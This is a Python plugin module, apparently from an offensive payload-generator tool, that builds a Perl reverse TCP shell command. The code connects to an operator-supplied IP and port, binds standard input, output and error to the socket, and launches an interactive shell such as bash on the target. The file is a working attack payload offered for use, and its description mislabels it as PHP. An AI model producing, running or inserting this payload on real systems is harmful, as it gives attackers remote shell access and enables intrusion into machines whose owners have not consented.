from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )

        self.opts.description = "[ReverseShell][TCP] PHP from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = """perl -e 'use Socket;$i="{}";$p={};""".format(self.args.ip, self.args.port)
        self.shell += """socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,"""
        self.shell += """sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
        self.shell += """exec("{} -i");""".format(self.args.shell)
        self.shell += """};'"""
